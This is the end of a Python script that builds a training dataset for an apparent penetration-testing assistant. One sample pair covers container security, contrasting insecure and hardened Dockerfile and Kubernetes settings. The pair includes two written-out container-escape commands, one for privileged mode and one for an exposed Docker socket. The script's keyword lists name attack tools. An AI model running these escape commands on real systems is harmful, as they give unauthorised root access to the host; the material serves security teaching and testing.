add(
    "What container security issues should static analysis and penetration testing identify?",
    """**Dockerfile Security Issues**

**Running as Root (CWE-250)**
```dockerfile
# BAD — container runs as root
FROM node:18
COPY . /app
CMD ["node", "server.js"]

# GOOD — non-root user
FROM node:18
RUN groupadd -r app && useradd -r -g app app
COPY --chown=app:app . /app
USER app
CMD ["node", "server.js"]
```

**Secrets in Build Layers**
```dockerfile
# BAD — secret visible in image layers
COPY .env /app/.env
ENV DB_PASSWORD=secret123

# GOOD — use build-time secrets or runtime env
RUN --mount=type=secret,id=db_pass cat /run/secrets/db_pass
```

**Unpinned Base Images**
```dockerfile
# BAD — mutable tag, supply chain risk
FROM python:latest

# GOOD — pinned digest
FROM python:3.12-slim@sha256:abc123...
```

**Container Runtime Attacks**

**Container Escape via Privileged Mode**
```bash
# If running with --privileged
mount /dev/sda1 /mnt
chroot /mnt /bin/bash  # Now on host filesystem
```

**Docker Socket Exposure**
```bash
# If /var/run/docker.sock is mounted
docker run -v /:/host --rm -it alpine chroot /host
```

**Kubernetes Pod Security**
```yaml
# BAD — no security restrictions
spec:
  containers:
  - name: app
    securityContext:
      privileged: true
      allowPrivilegeEscalation: true
      runAsUser: 0

# GOOD — restricted
spec:
  securityContext:
    runAsNonRoot: true
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
```

**Static Analysis Detection Points**
- Dockerfiles without USER directive
- COPY/ADD of sensitive files (.env, keys, certificates)
- Unpinned FROM tags
- docker-compose.yml with privileged: true
- Exposed Docker socket mounts
- Missing resource limits in K8s manifests"""
)

# ===========================================================================
# Final: Write output
# ===========================================================================

def main():
    os.chdir(os.path.dirname(os.path.abspath(__file__)))

    outfile = "pentagi_training_data.jsonl"
    with open(outfile, "w", encoding="utf-8") as f:
        for pair in PAIRS:
            f.write(json.dumps(pair, ensure_ascii=False) + "\n")

    size_kb = os.path.getsize(outfile) / 1024

    # Category analysis
    categories = {
        "pentest_methodology": 0,
        "tool_usage": 0,
        "attack_taxonomy": 0,
        "vulnerability_exploitation": 0,
        "privilege_escalation": 0,
        "defensive_perspective": 0,
        "knowledge_graph": 0,
        "agent_collaboration": 0,
        "secure_coding": 0,
        "attestor_integration": 0,
    }

    for p in PAIRS:
        inst = p["instruction"].lower()
        if any(w in inst for w in ["nmap", "sqlmap", "hydra", "gobuster", "metasploit", "nuclei", "impacket", "hashcat", "tcpdump", "binwalk", "radare"]):
            categories["tool_usage"] += 1
        elif any(w in inst for w in ["privilege escalation", "lateral movement", "post-exploitation"]):
            categories["privilege_escalation"] += 1
        elif any(w in inst for w in ["knowledge graph", "entity", "relationship"]):
            categories["knowledge_graph"] += 1
        elif any(w in inst for w in ["attestor", "static analysis"]):
            categories["attestor_integration"] += 1
        elif any(w in inst for w in ["secure coding", "prevent", "false positive"]):
            categories["defensive_perspective"] += 1
        elif any(w in inst for w in ["exploit", "injection", "xss", "ssrf", "csrf", "xxe", "deserialization", "traversal", "out-of-band"]):
            categories["vulnerability_exploitation"] += 1
        elif any(w in inst for w in ["penetration test", "reconnaissance", "methodology", "phases"]):
            categories["pentest_methodology"] += 1
        elif any(w in inst for w in ["agent", "collaborate", "team"]):
            categories["agent_collaboration"] += 1
        elif any(w in inst for w in ["taxonomy", "mitre", "att&ck"]):
            categories["attack_taxonomy"] += 1
        elif any(w in inst for w in ["container", "docker", "cli", "anti-pattern"]):
            categories["secure_coding"] += 1

    print(f"\n{'='*60}")
    print(f"  PENTAGI TRAINING DATA EXTRACTION REPORT")
    print(f"{'='*60}")
    print(f"\n  Total pairs: {len(PAIRS)}")
    print(f"  Output: {outfile} ({size_kb:.0f} KB)")
    print(f"\n  Category breakdown:")
    for cat, count in sorted(categories.items(), key=lambda x: -x[1]):
        if count > 0:
            print(f"    {cat:30s}: {count:3d}")
    uncat = len(PAIRS) - sum(categories.values())
    if uncat > 0:
        print(f"    {'uncategorized':30s}: {uncat:3d}")
    print(f"\n  Knowledge sources:")
    print(f"    pentester.tmpl  — attack methodology, tool catalog, Graphiti taxonomy")
    print(f"    adviser.tmpl    — strategic security guidance patterns")
    print(f"    coder.tmpl      — exploit development, code security")
    print(f"    searcher.tmpl   — vulnerability research methodology")
    print(f"    registry.go     — 40+ tool definitions with descriptions")
    print(f"    args.go         — tool parameter schemas")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    main()
